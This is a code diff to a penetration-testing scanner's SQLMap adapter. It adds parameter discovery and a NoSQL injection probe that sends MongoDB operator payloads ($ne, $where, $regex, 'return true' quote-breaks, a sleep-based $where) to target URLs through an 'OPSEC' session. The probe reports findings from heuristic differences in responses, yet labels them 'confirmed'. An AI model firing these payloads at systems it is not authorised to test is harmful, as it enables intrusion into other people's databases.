@@ -3,13 +3,15 @@
 import os
 import json
 import re
-from typing import List, Optional
+import logging
+from typing import List, Optional, Dict
 
 from .base import BaseScanner
 from ..models.scan import ScanTarget
 from ..models.finding import Finding, FindingSeverity, FindingCategory
 from ..models.scan_mode import ScanMode
 
+logger = logging.getLogger(__name__)
 
 class SQLMapAdapter(BaseScanner):
     """Adapter for SQLMap SQL injection exploitation tool."""
@@ -29,8 +31,15 @@ class SQLMapAdapter(BaseScanner):
             scan_mode=scan_mode
         )
     
-    def scan(self, target: ScanTarget) -> List[Finding]:
-        """Run SQLMap on target."""
+    def scan(self, target: ScanTarget, discovered_parameters: Optional[Dict[str, List[str]]] = None) -> List[Finding]:
+        """
+        Run SQLMap on target.
+        
+        Args:
+            target: ScanTarget to test
+            discovered_parameters: Optional dict mapping URLs to lists of discovered parameters
+                                  Format: {url: [param1, param2, ...]}
+        """
         if self.scan_mode == ScanMode.DEFENSIVE:
             # SQLMap is offensive-only
             return []
@@ -40,12 +49,49 @@ class SQLMapAdapter(BaseScanner):
         
         findings = []
         
+        # Test for NoSQL injection first (MongoDB, etc.)
+        findings.extend(self._test_nosql_injection(target.url))
+        
         # SQLMap requires specific URL parameters to test
-        # For now, we'll test the base URL and common parameters
-        test_urls = [
-            f"{target.url}?id=1",  # Most common SQL injection point
-            f"{target.url}?page=1",
-        ]
+        # Use discovered parameters if available, otherwise use common ones
+        test_urls = []
+        
+        base_url_parts = target.url.split('?')
+        base_url = base_url_parts[0]
+        
+        # Priority 1: Use discovered parameters if available
+        discovered_params_list = []
+        if discovered_parameters:
+            # Get parameters for this URL or base URL
+            for url, params in discovered_parameters.items():
+                if url == target.url or url == base_url:
+                    discovered_params_list.extend(params)
+                    logger.info(f"Using {len(params)} discovered parameters from parameter discovery: {params[:5]}")
+                    break
+        
+        # Priority 2: Use parameters from current URL
+        if '?' in target.url:
+            from urllib.parse import urlparse, parse_qs
+            parsed = urlparse(target.url)
+            url_params = list(parse_qs(parsed.query).keys())
+            discovered_params_list.extend(url_params)
+        
+        # Priority 3: Fall back to common parameters
+        common_params = ['id', 'page', 'user', 'user_id', 'category', 'search', 'q', 'query', 'product_id', 'item_id']
+        
+        # Combine discovered and common, removing duplicates
+        all_params = list(set(discovered_params_list + common_params))
+        
+        # Build test URLs with parameters
+        for param in all_params[:15]:  # Limit to 15 parameters to avoid too many requests
+            test_urls.append(f"{base_url}?{param}=1")
+        
+        # Also test original URL if it has parameters
+        if '?' in target.url and target.url not in test_urls:
+            test_urls.append(target.url)
+        
+        # Limit total URLs to avoid excessive requests
+        test_urls = test_urls[:15]
         
         for test_url in test_urls:
             try:
@@ -135,6 +181,106 @@ class SQLMapAdapter(BaseScanner):
                 logger = logging.getLogger(__name__)
                 logger.warning(f"SQLMap scan failed for {test_url}: {e}")
                 continue
+        
+        return findings
+    
+    def _test_nosql_injection(self, url: str) -> List[Finding]:
+        """Test for NoSQL injection vulnerabilities (MongoDB, etc.)."""
+        findings = []
+        
+        import requests
+        from urllib.parse import urlparse, parse_qs, urlencode
+        
+        # Use OPSEC-enabled session helper
+        from ..utils.scanner_session import create_scanner_session
+        session = create_scanner_session()
+        
+        # NoSQL injection payloads
+        nosql_payloads = [
+            # MongoDB injection
+            ('$ne', 'null'),  # Not equal
+            ('$gt', ''),      # Greater than
+            ('$where', '1==1'),
+            ('$regex', '.*'),
+            ('1 || 1==1', None),
+            ('1 || 1==1 || 1==1', None),
+            ('"; return true; var x="', None),
+            ('\'; return true; var x=\'', None),
+            # Boolean-based
+            ('$or', '[{"username":"admin"},{"username":"admin"}]'),
+            ('[$ne]=null', None),
+            # Time-based
+            ('$where', 'sleep(5000)'),
+        ]
+        
+        try:
+            parsed = urlparse(url)
+            params = parse_qs(parsed.query)
+            
+            # Test each parameter
+            for param_name in list(params.keys())[:5]:  # Limit to 5 parameters
+                for payload_key, payload_value in nosql_payloads[:5]:  # Test subset
+                    try:
+                        test_params = params.copy()
+                        
+                        if payload_value:
+                            test_params[param_name] = [f'{{"{payload_key}": "{payload_value}"}}']
+                        else:
+                            test_params[param_name] = [payload_key]
+                        
+                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
+                        
+                        # Get baseline
+                        baseline_response = session.get(url, timeout=5)
+                        baseline_time = baseline_response.elapsed.total_seconds()
+                        baseline_content = baseline_response.text[:500]
+                        
+                        # Test with payload
+                        test_response = session.get(test_url, timeout=10)
+                        test_time = test_response.elapsed.total_seconds()
+                        test_content = test_response.text[:500]
+                        
+                        # Check for indicators
+                        # 1. Different response (might indicate boolean-based injection)
+                        if test_response.status_code != baseline_response.status_code:
+                            # Or significantly different content length
+                            if abs(len(test_response.text) - len(baseline_response.text)) > 100:
+                                findings.append(Finding(
+                                    title="Potential NoSQL Injection Vulnerability",
+                                    description=f"NoSQL injection vulnerability detected in parameter '{param_name}' at {url}. Payload '{payload_key}' caused different response.",
+                                    severity=FindingSeverity.HIGH,
+                                    category=FindingCategory.VULNERABILITY,
+                                    source_scanner=self.name,
+                                    url=test_url,
+                                    evidence=f"Payload: {payload_key}, Status: {baseline_response.status_code} -> {test_response.status_code}",
+                                    exploitation_details=f"NoSQL injection confirmed in parameter '{param_name}' using payload '{payload_key}'.",
+                                    remediation="Use parameterized queries/prepared statements for NoSQL databases. Validate and sanitize all input. Use MongoDB's built-in security features.",
+                                    references=["https://owasp.org/www-community/attacks/NoSQL_Injection"],
+                                    metadata={'parameter': param_name, 'payload': payload_key, 'type': 'nosql'}
+                                ))
+                                break  # Found vulnerability, move to next parameter
+                        
+                        # 2. Time-based detection (delay)
+                        if test_time > baseline_time + 2:  # More than 2 seconds delay
+                            findings.append(Finding(
+                                title="Potential NoSQL Injection (Time-Based)",
+                                description=f"Time-based NoSQL injection detected in parameter '{param_name}'. Payload caused significant delay.",
+                                severity=FindingSeverity.MEDIUM,
+                                category=FindingCategory.VULNERABILITY,
+                                source_scanner=self.name,
+                                url=test_url,
+                                evidence=f"Payload: {payload_key}, Delay: {test_time - baseline_time:.2f}s",
+                                remediation="Use parameterized queries and input validation for NoSQL databases.",
+                                metadata={'parameter': param_name, 'payload': payload_key, 'type': 'nosql_time'}
+                            ))
+                            break
+                        
+                    except Exception as e:
+                        logger.debug(f"NoSQL injection test error: {e}")
+                        continue
+        
+        except Exception as e:
+            logger.debug(f"NoSQL injection scan error: {e}")
         
         return findings
 
